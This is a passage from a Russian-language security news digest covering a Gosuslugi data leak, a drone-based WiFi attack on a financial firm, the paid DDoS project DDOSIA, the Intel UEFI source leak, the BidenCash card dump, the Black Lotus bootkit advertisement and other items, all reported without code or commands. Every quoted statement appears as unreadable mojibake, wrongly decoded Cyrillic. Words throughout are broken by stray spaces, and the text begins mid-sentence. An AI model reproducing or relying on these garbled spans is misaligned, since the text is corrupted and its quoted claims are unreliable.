     þò â ñòàíäàðòíûõ ó÷åòíûõ çàïèñÿõ Ãîñóñëóã. Âìåñòå ñ òåì â áàçå ïðè-
       ñóòñòâóåò ðÿä èäåíòèôèêàòîðîâ, êîòîðûå â Ãîñóñëóãàõ íå ñîäåðæàòñÿ:
      íàèìå íîâàíèå èíôîðìàöèîííîé ñèñòåìû, äàííûå î ñòàòóñå ïðîâåðêè
      ïàñïîðòà ãðàæäàíèíà è ðÿä äðóãèõ. Çíà÷èò, ýòè äàííûå íå ìîã ëè áûòü
      âûã ðóæåíû èç èíôîðìàöèîííûõ ñèñòåì ïîðòàëà», — ñîîáùèëè â êîì-
      ïàíèè.                »
Эк сперты так же отметили, что часть информации в базе, включая дату выг -
рузки, была изменена вручную, чтобы создать впечат ление постоян ного дос-
тупа злоумыш ленников в систему. Тог да как реаль ная дата утечки — 24 янва-
ря 2021 года.


      «Ðåçóëüòàòû ðàññëå äîâàíèÿ äàþò îñíîâàíèÿ äëÿ âûâîäà, ÷òî èñòî÷íèêîì
       óòå÷êè ñòàëà ñèñòåìà, â êîòîðîé óêàçàííûå äàííûå ñîáèðàþòñÿ îò ïîëü-«
      çîâàòå ëåé ñàìîñòîÿòåëüíî. Òåõ íè÷åñêèå äåòàëè èíöèäåíòà 11 îêòÿáðÿ
      ïîçâîëÿ þò ïðåäïîëîæèòü, ÷òî ýòî ìîãóò áûòü ðåñóðñû „Ïî÷òû Ðîñ-
       ñèè“», — çàÿâèëè â ïðåññ‑ñëóæáå «Ðîñòåëåêîìà».                »
В ком пании заверили, что инцидент не зат ронул безопасность дан ных поль -
зователей портала Госуслуг, так как их логины и пароли не были ском промети-
рованы. Кроме того, у подавляющего боль шинства аккаунтов из базы под клю-
чена двухфакторная аутен тификация, а это «исключает возможность взлома
этих учет ных записей с помощью автоматического перебора паролей».


50+ КРИПТОВАЛЮТНЫХ БАНКОМАТОВ
Ко личес тво криптовалют ных банкоматов в Рос сии перевалило за 50, хотя юрис ты отме чают,
что тер миналы все еще находят ся в «серой зоне» и неяс но, как будут защище ны права граждан,
если воз никнут проблемы. Такие машины поз воля ют обме нивать наличные или без наличные
день ги на криптовалюту и наобо рот — конвертировать криптовалюты в фиат (на банков ский
счет).


По данным компании RusBit, которая занимается установ кой криптоматов, в этом году в Мос -
кве появилось 14 новых криптоматов, а общее количес тво машин в РФ дос тигло 52 штук .

Жур налис ты «Коммерсанта» про вели экспе римент и приобре ли через криптомат немного бит -
коинов. Курс покупки сос тавил 1,494 миллиона руб лей, что на 10–14% пре вышало курс
в интернет-обменниках.





ХАКЕРСКИЕ ДРОНЫ
СТАЛИ
РЕАЛЬНОСТЬЮ
ИБ-специалист Грег Линарес (Greg Linares) сообщил об интересной атаке,
произошед шей летом текущего года. Неназванная финан совая ком пания
из США обнаружила, что на кры шу ее офиса призем лились модифицирован -
ные дроны DJI Matrice 600 и DJI Phantom, оснащен ные пен тестерским девай-
сом WiFi Pineapple, и пытались исполь зовать MAC-адрес одного из сот рудни-
ков.
  О нестандартной атаке Линарес рассказал в Twitter, при этом отказавшись
сообщить название пострадавшей ком пании. Журналисты издания The Register
сами проверили историю специалиста, связавшись с пред ставителями ком -
пании-жертвы, и под твердили, что попыт ка взлома при помощи модифициро-
ван ных дронов действитель но имела место.
  Исследователи давно предупреждают и строят теории о хакерском потен -
циале беспилот ников. После того как в продаже появились доступные модели
пот ребитель ских квад рокоптеров, эта тема не раз под нималась на ИБ-кон -
ферен циях, например Black Hat, как в США, так и в Европе.
   Кроме того, еще в 2013 году известный исследователь Сэми Кам кар (Samy
Kamkar) показы вал свой дрон SkyJack , который оснащался Raspberry  Pi
для захвата дру гих дронов через Wi-Fi. А в 2017 году DIY-энту зиаст Наоми Ву
(Naomi Wu) продемонстрировала проект под названием Screaming Fist , так же
направлен ный на создание хакерского квад рокоптера. Пару лет назад и мы
посвятили захвату дронов боль шую статью, которую ты можешь найти здесь .
  Но теперь проблема переходит из теорий в реаль ность. Линарес расска-
зывает, что все началось с того, что ком пания-жертва обнаружила на внут -
ренней странице Atlassian Conuence необычную активность, которая исходила
из сети ком пании.
  Служба безопасности отреагировала быстро и выяснила, что сот рудник,
MAC-адрес которого исполь зовался для частичного доступа к Wi-Fi-сети ком -
пании, так же вошел в систему дома за много километ ров от офиса. То есть
поль зователь был активен за пределами офиса, но кто-то, находившийся
в радиусе действия Wi-Fi-сети здания, пытался исполь зовать его MAC-адрес.
Тог да коман да попробовала отследить Wi-Fi-сиг нал, исполь зовав для иден -
тификации устройства систему Fluke. Это привело защит ников на кры шу зда-
ния, где они обнаружили дроны DJI Matrice 600 и DJI Phantom.
  По словам Линареса, Phantom был в отличном состоянии и имел на борту
модифицирован ное пен тестерское устройство WiFi Pineapple. Дрон Matrice
и вовсе принес кейс, в котором находились Raspberry Pi, несколь ко акку муля-
торов, мини-ноут бук GPD, 4G-модем и еще один Wi-Fi-девайс. Этот беспилот -
ник призем лился рядом с системой отопления и вен тиляции здания и выг лядел
поврежден ным, хотя тоже работал.


      «Â õîäå ðàññëå äîâàíèÿ áûëî óñòàíîâëåíî, ÷òî èçíà÷àëüíî äðîí DJI
      Phantom èñïîëüçîâàëñÿ çà íåñêîëüêî äíåé äî ýòîé àòàêè äëÿ ïåðåõ âàòà«
       ó÷åòíûõ äàííûõ è Wi-Fi ñîòðóäíèêà. Ýòè äàííûå ïîçæå æåñòêî çàï -
      ðîãðàììèðîâàëè â èíñòðóìåíòû, êîòîðûå áûëè ðàçâåðíóòû ñ ïîìîùüþ
       Matrice», — îáúÿñíÿ åò Ëèíàðåñ.                »
По словам эксперта, инстру мен ты на дронах исполь зовались для прицель ной
атаки на внут реннюю страницу Conuence ком пании, в попыт ке получить дос-
туп к дру гим внут ренним устройствам и хранящим ся там учет ным дан ным.


      «Çëîóìûøëåííèêè ñïå öèàëüíî íàöåëèâàþòñÿ íà ñåòè ñ îãðàíè÷åííûì
      äîñòóïîì, êîòîðûå èñïîëüçóþòñÿ êàê òðåòüèìè ñòîðîíàìè, òàê è âíóòðè«
      êîìïàíèè è êîòîðûå ïëîõî çàùèùå íû èç‑çà êàêèõ‑òî íåäàâíèõ èçìå -
      íåíèé â êîìïàíèè (íàï ðèìåð, ðåñòðóê òóðèçàöèÿ/ðåáðåíäèíã, ïåðå åçä
      â íîâîå çäàíèå, íîâûå íàñòðîéêè ñåòè èëè ñî÷åòàíèå ýòèõ ñöå íàðè-
       åâ), — ðàññêàçûâàåò ñïå öèàëèñò. — Ïî ýòîé ïðè÷èíå âðå ìåííàÿ ñåòü,
       ê ñîæàëå íèþ, èìå ëà îãðàíè÷åííûé äîñòóï äëÿ âõîäà â ñèñòåìó (ó÷åòíûå
      äàííûå + MAC). Çëîóìûøëåííèêè èñïîëüçîâàëè àòàêó äëÿ äîñòóïà
       ê âíóòðåííå ìó ñåðâåðó Confluence, êîòîðûé ñîäåðæàë äðóãèå ó÷åòíûå
      äàííûå äëÿ äîñòóïà ê äðóãèì ðåñóðñàì».                »
Аналитик считает, что злоумыш ленники хорошо под готовились к атаке: нес-
коль ко недель пот ратили на разведку, находились неподалеку от целевой сре-
ды, имели неплохой бюд жет и знали, с какими ограничениями по части
физической безопасности им придет ся столкнуть ся.
  Линарес подытоживает, что эта атака имела «ограничен ный успех», но стала
уже треть ей кибератакой с участием дрона, которую лично он видел за пос-
ледние два года.

      «Ñåé÷àñ, â 2022 ãîäó, ìû íàáëþäàåì ïî‑íàñòîÿùå ìó óäèâèòåëüíûå äîñ-
      òèæåíèÿ äðîíîâ â îáëàñòÿõ ìîùíîñòè, äàëüíîñòè è âîçìîæíîñòåé (íàï -«
      ðèìåð, óäèâèòåëüíûå øîó ñèíõðîíèçèðîâàííûõ áåñïèëîòíèêîâ â Êèòàå,
      îíè ïðîñòî ôàíòàñòè÷åñêèå).
       Âìåñòå ñ òåì âàðèàíòû ïîëåçíûõ íàã ðóçîê äëÿ äðîíîâ ñòàíîâÿòñÿ
      âñå ìåíüøå è ýôôåêòèâíåå (íàï ðèìåð, Flipper Zero), è ýòî ñîçäàåò æèç-
      íåñïîñîáíûå ìîäåëè àòàê, êîòîðûå öåëåñîîáðàçíî ïðèìåíÿòü â ðåàëü-
      íîñòè. Êîìïàíèè, ðàáîòàþùèå â îáëàñòÿõ ôèíòåõà, êðèï òû è öåïî÷êè
      ïîñòàâîê, à  òàê æå âàæíûå ïîñòàâùèêè  ïðîã ðàììíîãî îáåñïå÷åíèÿ
      ìîãóò ñòàòü èäå àëüíûìè öåëÿìè äëÿ òàêèõ àòàê, ãäå çëîóìûøëåííèê
      ìîæåò ëåã êî ïîê ðûòü ñâîè ýêñïëóàòàöèîííûå ðàñõîäû çà ñ÷åò íåìåä-
      ëåííîé ôèíàíñîâîé  âûãîäû  èëè  äîñòóïà  ê  áîëåå  ïåðñïåê òèâíûì
      öåëÿì», — ðåçþìèðóåò ýêñïåðò.                »

ДУРОВ ПРОТИВ WHATSAPP





В сентябре текуще го года в WhatsApp обнаружили и исправили сразу две критичес кие RCE-
уяз вимос ти. Пос ле это го Павел Дуров пос вятил мес сендже ру отдель ный пост в сво ем
Telegram-канале и напомнил, что это далеко не пер вая проблема с безопас ностью в WhatsApp,
заявив, что сам отказал ся от его исполь зования мно го лет назад.

         «Каждый год мы узнаем о какой-то проблеме в WhatsApp, которая ставит→      под угро зу все, что находит ся на устройствах поль зовате лей. Это значит, что
      там почти навер няка уже сущес твует новая уяз вимость. Такие проблемы вряд
      ли можно наз вать случайными — это (спе циаль но) заложенные бэкдоры. Если
      один бэкдор обнаружен и его нужно удалить, на его мес то добав ляет ся другой.
         Вот почему я удалил WhatsApp со сво их устройств мно го лет назад. Уста-
       нов ленное приложе ние соз дает дверь для про никновения в ваш телефон.
        Я не призываю людей перехо дить на Telegram. С 700+ млн активных поль -
       зовате лей и 2+ млн ежед невных под писчиков Telegram не нуждает ся в допол -
       нитель ной рекламе. Вы можете исполь зовать любое приложе ние для обме на
      сообщениями, которое вам нравит ся, но дер житесь подаль ше от WhatsApp,
       уже 13 лет он служит инс трументом для слежки»,


— пишет осно ватель Telegram.





                                       Продолжение статьи →
← Начало статьи
 КРАУДСОРС НА DDOS
  Эк сперты ком пании Radware обнаружили краудсорсин говый DDoS-проект
  DDOSIA, в рам ках которого русскоязычная хак-группа платит доброволь цам
   за участие в атаках на запад ные организации.
    Исследователи отмечают, что DDoS-атаки давно стали мощным ору жием
   в руках хак тивистов самых разных стран, ведь такие атаки лег ко организовать
  и осу ществить, а ущерб, нанесен ный перебоями в работе ком паний и орга-
  низаций, может вести как к финан совым потерям, так и к более серь езным
  последствиям. Однако обычно доброволь цы, участву ющие в DDoS-атаках,
  не получают вознаграждений за свою «работу», поэтому обнаружение проекта
  DDOSIA — событие доволь но неординарное.
    По дан ным Radware, проект был запущен в августе 2022 года группировкой
  NoName057(16), которая появилась в марте текущего года.





  Впервые эта хак-группа упоминалась в сен тябрь ском отчете ком пании Avast,
  где описывался модуль для DDoS-атак, заг ружаемый трояном удален ного дос-
   тупа Bobik (эта малварь известна с 2020 года и распространяет ся стилером
   RedLine). Эксперты Avast наблюдали за NoName057(16) три месяца, с июня
  по сен тябрь текущего года, и приш ли к выводу, что группировка проводит
  DDoS-атаки против украинских организаций, хотя успешны толь ко около 40%
  из них.
     Как теперь рассказали аналитики Radware, сравнитель но недавно груп-
  пировка запустила в Telegram проект DDOSIA, где операторы разместили ссыл-
   ку на GitHub с инструк циями для потен циаль ных «волон теров». На сегод -
  няшний   день   основной   Telegram-канал   группировки   насчитывает
  более 13 тысяч под писчиков.





  По словам исследователей, порой DDOSIA атакуют те же цели, которые уста-
  навливает пророссийская хак-группа KillNet. В частности, они принимали учас-
   тие в недавней масштабной DDoS-атаке на крупные аэропорты в США.
    Доброволь цы DDOSIA регистрируют ся через Telegram, чтобы получить ZIP-
   архив с малварью (dosia.exe), которая содержит уникаль ный ID для каждого
  поль зователя. Самая интересная особен ность этого проекта — участники
   могут связать свой ID с криптовалют ным кошель ком и получать день ги за учас-
   тие в DDoS-атаках. Причем оплата пропорциональ на мощностям, которые пре-
  доставляет кон крет ный участник.





  Лучшие участники каждой волны атак получают: за первое место — 80 тысяч
  рублей (примерно 1255 долларов США), за второе место — 50 тысяч рублей
   (примерно 785 долларов США), а за третье место — 20 тысяч рублей (при-
  мерно 315 долларов США). К тому же во время атак на американ ские аэро-
  порты операторы DDOSIA объявили, что распределят дополнитель ные выплаты
  среди топ-10 участников.
     Эк сперты резюмируют, что в настоящее время DDOSIA насчитывает око-
  ло 400  участников и остается  полузак рытой группой, доступной  толь ко
  по приг лашениям, которая регулярно атакует боль ше 60 воен ных и образова-
   тель ных организаций.
     При этом в Radware выражают обеспокоенность тем, что финан совый сти-
  мул позволит NoName057(16) привлечь к DDoS-атакам массу доброволь цев
  и может задать тренд для дру гих DDoS-группировок.
    Ин тересно, что после выхода нашей публикации, посвящен ной DDOSIA,
   в Telegram-канале NoName057(16) появилось сообщение, в котором участники
   группировки под черкивают, что не сот рудничают с KillNet.

       «Ìû ðàáîòàåì íåçàâèñèìî è íå èìå åì íèêàêîãî îòíîøåíèÿ ê õàê‑ãðóï -
        ïå KillNet. Ñâîè öåëè äëÿ DDoS-àòàê ìû âûáèðàåì ñàìè», — çàÿâèëè «
         õàêåðû.                 »

 43% УСТРОЙСТВ НЕ СООТВЕТСТВУЮТ ТРЕБОВАНИЯМ
 WINDOWS 11

  По информации аналитиков компании Lansweeper, стро гим сис темным тре бованиям Windows
   11 не соот ветс твуют око ло 42,7% рабочих станций на крупных пред приятиях. Дело в том, что
   новая ОС сов местима далеко не со все ми про цес сорами, а также тре бует обя затель ного
   наличия TMP (Trusted Platform Module) и под дер жки Secure Boot. Эти тре бования можно обойти
   с помощью установ ки «вручную», но потом для таких сис тем не гарантируются обновле ния.

  В Lansweeper пришли к выводу, что пример но из 30 000 000 устройств, работающих
   под управле нием Windows в 60 000 организаций, в сред нем толь ко 57,26% рабочих станций
   смо гут авто матичес ки обно вить ся до Windows 11.





   Толь ко 57,26% про тес тированных про цес соров для рабочих станций соот ветс тво вали сис -
   темным тре бованиям Windows 11. При этом боль шинс тво машин про ходят по объ ему опе ратив -
   ной памяти ( 92,85% ), но с TPM все в поряд ке толь ко в 65% случаев.

   Хуже того, тест на TPM про ходят толь ко 2,35% физичес ких сер веров, то есть не удас тся
   обно вить 97% из них, если Microsoft в будущем соз даст сер верную ОС с аналогичными тре -
   бованиями.





   Также проблема с TMP име ется у боль шинс тва вир туаль ных сер веров и рабочих станций
     ( 98,62% и 99,87% соот ветс твенно).

   При этом, по срав нению с 2021 годом, у Microsoft про цент устройств, отве чающих тре бова-
   ниям для ЦП и TPM, уве личил ся на 12% .

   Ис сле дователи прог нозируют,  что, если рост  про дол жится, теоре тичес ки боль шинс тво
   устройств будут сов местимы с Windows 11 к 2026 году.





 УТЕЧКА У INTEL
  Ком пания Intel под твердила слу хи об утечке докумен тации и исходного кода
   UEFI BIOS для процессоров Alder Lake (кодовое название процессоров Intel 12-
   го поколения, которые выпускают ся с ноября 2021 года).
     Ссылки на исходный код UEFI для Intel Alder Lake опубликовал поль зователь
   Twitter под ником  Freak,  и, по его утверждению, утечка корнями уходит
  на 4chan. Эта ссылка вела на репозиторий GitHub с названием ICE_TEA_BIOS,
  который был заг ружен поль зователем LCFCASD. Репозиторий содержал нечто,
  описан ное как «Код BIOS из проекта C970».





  В общей сложности дамп содержит 5,97 Гбайт дан ных, включая исходный код,
  приват ные ключи, журналы изменений и инстру мен ты ком пиляции. Причем
  некоторые файлы датированы 30 сен тября 2022 года, то есть, вероятно,
  имен но в кон це прош лого месяца хакер или инсайдер слил дан ные.
     Как сообщили СМИ, весь утек ший исходный код создан ком панией — раз-
  работ чиком прошивок для UEFI Insyde Software Corp. Кроме того, утечка
  содержит многочисленные отсылки к ком пании Lenovo, в том числе код
  для интеграции с Lenovo String Service, Lenovo Secure Suite и Lenovo Cloud
   Service. При этом в Lenovo и Insyde Software Corp никак не проком ментировали
   ситу ацию.
     Зато ком пания Intel была вынуждена под твердить журналистам издания
   Tom’s Hardware, что утечка под линна и это действитель но «проприетарный код



         «Ïîõîæå, íàø ïðîï ðèåòàðíûé êîä UEFI áûë ïîõèùåí òðåòüåé ñòîðîíîé.
      Ìû íå ñ÷èòàåì, ÷òî ýòî âûÿâëÿåò êàêèå‑òî íîâûå ïðîáëåìû áåçîïàñ-   UEFI».«
          íîñòè,  ïîñêîëüêó ìû  íå  ïîëàãàåìñÿ  íà  îáôóñêàöèþ èíôîðìàöèè
         â êà÷åñòâå ìåðû çàùèòû. Ýòîò êîä ó÷àñòâóåò â íàøåé ïðîã ðàììå bug
          bounty, â ðàìêàõ Project Circuit Breaker, è ìû ïðèçûâàåì âñåõ èññëå -
         äîâàòåëåé, êîòîðûå ñìîãóò îáíàðóæèòü ïîòåíöèàëüíûå  óÿçâèìîñòè,
        îáðàòèòü íà íèõ íàøå âíèìàíèå ÷åðåç ýòó ïðîã ðàììó», — çàÿâèëè ïðåä-
         ñòàâèòå ëè Intel.                 »
  К сожалению, невзирая на эти заверения Intel, ИБ-эксперты считают, что утечка
  исходного кода все же может пред ставлять угрозу, как минимум — упростит
  поиск уязвимостей в коде.

         «Àòàêóþùèé/áàã õàíòåð ìîæåò èçâëå÷ü îãðîìíóþ âûãîäó èç òàêèõ óòå ÷åê,
        äàæå åñëè ýòî óòå÷êà OEM-èìïëå ìåíòàöèè, êîòîðàÿ ëèøü ÷àñòè÷íî «
         èñïîëüçóåòñÿ  â  ïðîèçâîäñòâå», —  ïèøóò  ñïå öèàëèñòû  êîìïàíèè
         Hardened Vault, çàíèìàþùåéñÿ áåçîïàñíîñòüþ îáîðóäîâàíèÿ.                 »
  Эк сперт Positive Technologies Марк Ермолов и вовсе обнаружил, что дамп
  содержит приват ный ключ шифрования KeyManifest, исполь зуемый для защиты
   плат формы Intel Boot Guard. Хотя пока неясно, исполь зовался ли этот ключ
   в производстве, в теории злоумыш ленники могут задействовать его для изме-
  нения политики заг рузки в прошивке Intel и обхода аппарат ной безопасности.


 В 18 РАЗ ВЫРОСЛА ВЫРУЧКА ОТ МАЙНИНГА

   Сог ласно отче ту компании Intelion Data Systems, с 2017 по 2021 год выручка от майнинга бит -
   коина в Рос сии вырос ла в 18 раз: за четыре года этот показатель уве личил ся с 7 миллиар дов
   руб лей в 2017 году до 128 миллиар дов руб лей в 2021 году.

  Од нако в 2022 году суммарная выручка от добычи бит коина в РФ снизилась и за восемь
   месяцев сос тавила чуть боль ше 57 миллиар дов руб лей. Учитывая, что вто рой квар -
   тал 2022 года экспер ты называют худ шим за одиннадцать лет наблюдений, а хешрейт BTC,
   пос тупающий с тер ритории Рос сии, сокращается, годовой показатель может сос тавить при-
   мер но 85,59 миллиар да руб лей.

   Интерес но, что в нас тоящее вре мя майнеры в Рос сии рас ходуют столь ко же электричес тва,
   сколь ко и сель ское хозяйство.





 КАРДЕРЫ РАЗДАЮТ
 КАРТЫ ДАРОМ
  Кардерский даркнет-ресурс BidenCash снова устроил гром кую «рек ламную
   акцию». Администрация сайта бесплат но опубликовала огромный дамп, содер-
  жащий информацию о 1 221 551 бан ковской карте, позволяя любому жела-
  ющему заг рузить эти дан ные.
     Сайт BidenCash был запущен весной 2022 года и почти сразу заявил о себе
  аналогичной акцией: тог да операторы BidenCash решили бесплат но раздать
  всем желающим CSV-файл, содержащий имена, адреса, номера телефонов,
  адреса элек трон ной почты и номера бан ковских карт, и таким образом прорек -
  ламировать свою плат форму. Весной ИБ-специалисты сообщали, что в дам пе
  можно найти дан ные примерно 6600 бан ковских карт и около 1300 из них —
   это новые и действитель ные карты.
     Теперь кардеры начали новую, более масштабную акцию, судя по всему
  призванную прорек ламировать новые URL-адреса площад ки, запущен ные пос-
  ле мощных DDoS-атак, которым BidenCash под вергался в прош лом месяце.





  Чтобы обеспечить более широкий охват, мошен ники рек ламиру ют новый бес-
   плат ный дамп с картами даже в откры том интернете и на дру гих хакерских
  и кардерских форумах. По дан ным исследователей из ком пании Cyble, сум -
  марно новый дамп содержит информацию о 1,2 миллиона карт со всего мира,
  со сроком действия между 2023 и 2026 годами. В основном они принад лежат
  поль зователям из США.
     Для боль шинства карт доступны следующие типы дан ных:
   • номер карты;
   • срок действия;
   • CVV-номер;
   • имя владель ца;
   • название бан ка;
   • тип карты, статус и класс;
   • ад рес владель ца (штат и почтовый индекс);
   • ад рес элек трон ной почты;
   • номер социаль ного страхования;
   • номер телефона.

  Аналитики считают, что в основном дан ные о картах были получены с помощью
  веб-ским меров — вредоносных скриптов, которые хакеры внед ряют на стра-
  ницы оформления заказов в интернет-магазинах. Такие скрипты вору ют
  информацию о бан ковских картах и прочие дан ные поль зователей.
     Так как в даркнете дам пы такого размера обычно оказываются фаль шив-
  ками (прямыми под делками или старыми дам пами, которые переупакованы
  под новым именем), журналисты издания Bleeping Computer вниматель но изу -
  чили этот слив вместе с аналитиками из ИБ-ком пании D3Lab.
     К сожалению, в итоге исследователи под твердили, что дан ные из несколь -
   ких италь янских бан ков реаль ны, а утек шие записи соот ветству ют настоящим
   картам и их владель цам. Тем не менее боль шая часть дам па все же оказалась
  переработана и составлена из дру гих утечек, например из старого дам па мар-
   кет плейса All World Cards, который ранее тоже бесплат но раздавал карты всем
  желающим.
     Су дя по изу чен ной экспертами D3Labs выборке, около 30% карт оказались
   «свежими». Если экстраполировать этот резуль тат на весь дамп, поряд -
   ка 350 тысяч карт, распространяемых злоумыш ленниками, могут оказать ся
  действитель ными. При этом исследователи говорят, что примерно 50% италь -
   янских карт уже могут быть заблокированы, посколь ку бан ки-эмитен ты обна-
  ружили мошен ническую активность. Это означает, что пред ставлять цен ность
  для хакеров может лишь около 10% этой утечки.


 БОЙСЯ ПЫЛЕСОСА, %USERNAME%





   Сер гей Бело усов, осно ватель таких компаний, как Acronis и Parallels, сообщил жур налис там,
   что, по его мне нию, любые умные девайсы пред став ляют угро зу для безопас ности и конфиден-
   циаль нос ти поль зовате лей, но те даже не соз нают это го.
      Пред приниматель, инвестор и спе циалист объ яснил, что даже сов ременный пылесос,
   веро ятно, под ключен к интерне ту, име ет камеру, микрофон и кар ту всей квар тиры поль зовате -
   ля. Таким образом, пылесос собирает все данные яко бы для удобс тва владель ца, но нет
   никако го спо соба узнать, как именно эти данные исполь зуют ся и на что в ито ге могут сго дить -
    ся. По его сло вам, люди вообще не задумывают ся о рис ках, которые сопряжены с исполь -
   зованием мно гочис ленных умных устройств, и те внушают поль зовате лям ложное чувс тво
   безопас ности.

            «Вам сто ит боять ся сво его пылесо са, ведь  он, ско рее все го, сде лан →          в Китае. Вы необя затель но задумываетесь об этом, но это значитель ный
         потенциаль ный риск для безопас ности и конфиденциаль нос ти»,


  — заявил Бело усов.





                                          Продолжение статьи →
← Начало статьи
 НОВЫЙ UEFI-БУТКИТ
 BLACK LOTUS
  ИБ-эксперты обратили внимание, что на хакерских форумах рек ламиру ется
   UEFI-бут кит под названием Black Lotus. Его продавец утверждает, что Black
   Lotus имеет встроенный обход Secure Boot, встроенную защиту от удаления
  на уровне ring 0 / ядра, а так же запускает ся в режиме восстановления и в
  безопасном режиме.
    Специалисты  напоминают,  что  UEFI-бут киты  внед ряют ся  в прошивку
  и поэтому «невидимы» для защит ных продук тов, работающих в операционной
  системе, ведь такая малварь заг ружается на самом началь ном этапе.





  ИБ-специалист Скотт Шеферман (Scott Scheferman), одним из первых обра-
   тивший внимание на это объявление, сообщил, что Black Lotus имеет раз-
  мер 80 Кбайт, написан на ассем блере и C и умеет определять геозону жертвы,
   чтобы избегать заражения машин в странах СНГ. Вредонос пред лагается
   к продаже за 5000 долларов США, а каждая новая версия будет стоить
  еще 200 долларов США.
     Продавец утверждает, что малварь оснащена антивиртуализацией, анти-
  отладкой и обфускацией, что усложняет ее обнаружение и анализ. Так же, сог -
  ласно его заявлениям, защит ное ПО не сможет обнаружить и уничтожить бут -
   кит, так как тот запускает ся под учет ной записью SYSTEM внут ри легитим ного
  процесса.
    Помимо этого, Black Lotus якобы способен отключать защит ные механизмы
  на целевых машинах, в том числе Hypervisor-Protected Code Integrity (HVCI)
  и Windows Defender, а так же обходить User Account Control (UAC).


        «Ñàìî ÏÎ è îáõîä Secure Boot ðàáîòàþò íåçàâèñèìî îò ïîñòàâùèêà.
         Åñëè [íà öåëåâîé ìàøèíå] èñïîëüçóåòñÿ Secure Boot, äëÿ çàã ðóçêè áóò- «
         êèòà ïðèìåíÿ åòñÿ óÿçâèìûé ïîäïèñàííûé çàã ðóç÷èê, — ïîÿñíÿåò ïðî-
         äàâåö. — Èñïðàâèòü ýòó óÿçâèìîñòü â íàñòîÿùåå âðå ìÿ íåâîçìîæíî,
        ïîñêîëüêó îíà çàòðàãèâàåò ñîòíè çàã ðóç÷èêîâ, êîòîðûå èñïîëüçóþòñÿ
         â íàñòîÿùåå âðå ìÿ».                 »
  Стоит сказать, что о Black Lotus уже известно и «Лаборатории Касперского».
   Так, в недавнем интервью изданию The Register специалист ком пании Сергей
  Ложкин предупреждал, что возможности, описан ные в рек ламе бут кита, обыч-
  но  доступны  толь ко  серь езным  группам  «правитель ствен ных»  хакеров,
  которые имеют соот ветству ющее финан сирование и под готовку.
     Ложкин  признает ся,   что,  увидев  рек ламу  Black  Lotus  на  одном
  из хак-форумов, он сразу захотел заполу чить его, посколь ку просто необ-
  ходимо отреверсить такую малварь и немед ленно предупредить о ней кли-
   ентов.
     Скотт Шеферман сог ласен с тем, что доступность Black Lotus — это крайне
  опасная тен денция, однако эксперт пишет, что к рек ламе все же стоит отно-
   сить ся с долей скепсиса.

        «Ñëå äóåò îòìå òèòü,  ÷òî äî  òåõ  ïîð, ïîêà ìû èëè  êòî‑òî  äðóãîé
         íå ïîëó÷èì îáðàçåö ýòîé âðå äîíîñíîé ïðîã ðàììû è íå çàïóñòèì åå «
         íà ëàáîðàòîðíîé ìàøèíå, âñåã äà åñòü âåðîÿòíîñòü, ÷òî îíà åùå íå
         ãîòîâà äëÿ äåìîíñòðàöèè, à íåêîòîðûå àñïåêòû ôóíêöèé íå ðàáîòàþò
        äîëæíûì  îáðàçîì.  Ñóùåñòâóåò  äàæå  âåðîÿòíîñòü  òîãî,  ÷òî  âñå
         ýòî ìîøåííè÷åñòâî», — ãîâîðèò Øåôåðìàí.                 »

  NFT ЗА ПАРУ БАКСОВ

   Интерес к NFT (non-fungible token, «нев заимо заме няемый токен») замет но ослабевает, а вмес -
   те с ним снижает ся и сто имость NFT, которая еще недав но шокиро вала публику в заголов ках
  СМИ. К примеру, один из самых извес тных NFT — пер вый твит осно вате ля Twitter Дже ка Дор си
   потерял более 99% сво ей цены. Сина Эстави (Sina Estavi), вес ной 2021 года приобретший NFT
   за 2 900 000 долларов, попытал ся про дать его за 48 000 000, но получил лишь пару пред -
   ложений в 280 долларов и 96 долларов.


   За другой широко извес тный токен из кол лекции Azuki (K4M-1 # 03), который в прошлом году
   за 623 000 долларов приобрел извес тный ютубер Логан Пол, теперь дают лишь 10 дол-
   ларов. Другие токены Пола ( № 65 и №  68) из кол лекции Genesis Rocks, сто ившие ему
    1 550 000 долларов, подеше вели до 25 долларов.





 11 ТБАЙТ СТАРЫХ
 ДИСКЕТ И CD
  Архивист Internet Archive Джейсон Скотт (Jason Scott) объявил о запуске про-
   екта Discmaster, за созданием которого стоит группа аноним ных прог раммис-
   тов, занимающаяся «цифровой археологией». Discmaster позволяет любому
  желающему искать среди 92 миллионов старых файлов (более 11 Тбайт
  информации), извлечен ных с CD и дискет 1980, 1990 и 2000-х годов.
     Скотт рассказывает, что некоторое время назад с ним связалась группа
   энту зиастов, которая работала над созданием Discmaster более 18 месяцев
  и лишь после этого все же решила обратить ся за помощью. По словам архи-
  виста, он был просто пот рясен, ког да ознакомился с их работой, и сам почти
  не имеет отношения к созданию Discmaster. Фак тически Скотт лишь дал про-
   екту название и разместил его на своем сайте.
     Все файлы, объединен ные Discmaster, были взяты из Internet Archive, куда
   их многие годы постепен но заг ружали тысячи людей. До недавнего времени
   главная проблема зак лючалась в том, что люди мог ли делить ся с Internet
   Archive чем угод но: музыкой, тек стовыми докумен тами, древними мемами,
   старыми флеш-анимациями и так далее. Но единствен ным способом выяс-
   нить, какие имен но дан ные содержались на старых дискетах и ком пакт-дисках,
  была их заг рузка, после которой, по словам Скот та, оставалось лишь молить ся,
   чтобы наш лось под ходящее ПО для рен дерин га этой информации в понят ный
  кон тент.
     Авторы Discmaster проделали гигант скую работу и реализовали преобра-
   зование боль шинства форматов файлов на бэкен де. Например, можно искать
   старую музыку в MIDI или даже оцифрован ные зву ки Amiga и слу шать их прямо
   в браузере без каких-либо дополнитель ных инстру мен тов. То же самое каса-
   ется видеофайлов с низким  разрешением, изображений в  экзотических
  для нынеш него времени форматах и различных типов докумен тов.
     То есть любые старые форматы файлов доступны для просмотра прямо
   в браузере (как в современ ном, так и в устаревшем). Скотт говорит, что
   кто-либо на  старом Commodore 64 сможет без проблем  исполь зовать
   Discmaster, равно как и любой поль зователь с новейшей версией Chrome.
     На  текущий  момент  Discmaster  содержит  информацию  более  чем
  с 7800 ком пакт-дисков и дискет и насчитывает более 113 миллионов файлов.
  Сайт объединил все это через поисковую систему с возможностью выполнять
  поиск по типу файла, формату, источнику, размеру файла, дате и многим дру -
  гим парамет рам.


        «Íàâåðíîå, äëÿ ìåíÿ ýòî îäèí èç ñàìûõ âàæíûõ ïðîåêòîâ ïî èññëå -
         äîâàíèþ êîìïüþòåðíîé èñòîðèè çà ïîñëåäíèå äåñÿòü ëåò, — ãîâîðèò «
          Ñêîòò. — Ïîêà îí íå çàêîí÷åí. Îíè [ñîçäàòåëè Discmaster] ïðîàíàëèçè-
